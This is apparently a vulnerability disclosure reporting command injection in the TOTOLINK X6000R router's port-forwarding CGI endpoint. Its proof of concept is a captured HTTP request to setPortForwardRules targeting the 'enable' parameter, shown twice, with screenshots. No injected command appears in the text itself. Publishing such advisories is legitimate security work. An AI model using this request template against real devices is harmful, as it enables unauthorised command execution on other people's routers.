# Summary
There is a command execution vulnerability in TOTOLINK X6000R V9.4.0cu.852_B20230719(https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/247/ids/36.html).

Affected component is "/advance/portfwd.html".

# Details
Web front-end interface:
![image](https://github.com/user-attachments/assets/eb45cb66-ec43-403d-b730-b3cd06d7371f)


Capture the packet and see the enable parameter, and do a blind test directly:
![image](https://github.com/user-attachments/assets/677f27cc-fab4-4bee-9f34-6d6ca00b597b)

```HTTP
POST /cgi-bin/cstecgi.cgi?token=B5904DB48F93AAA0 HTTP/1.1
Host: ip:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 63
Origin: http://ip:8081
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://ip:8081/advance/portfwd.html?token=B5904DB48F93AAA0
Priority: u=1

{"enable":"1","addEffect":"0","topicurl":"setPortForwardRules"}
```
![image](https://github.com/user-attachments/assets/b6f1b82e-2409-42ea-9adf-cede51f8c27b)

![image](https://github.com/user-attachments/assets/23dd194d-da8f-41d9-a60f-d60073f5c718)


# PoC
Capture the packet and see the enable parameter, and do a blind test directly:
```HTTP
POST /cgi-bin/cstecgi.cgi?token=B5904DB48F93AAA0 HTTP/1.1
Host: ip:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 63
Origin: http://ip:8081
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://ip:8081/advance/portfwd.html?token=B5904DB48F93AAA0
Priority: u=1

{"enable":"1","addEffect":"0","topicurl":"setPortForwardRules"}
```
![image](https://github.com/user-attachments/assets/b6f1b82e-2409-42ea-9adf-cede51f8c27b)

![image](https://github.com/user-attachments/assets/23dd194d-da8f-41d9-a60f-d60073f5c718)
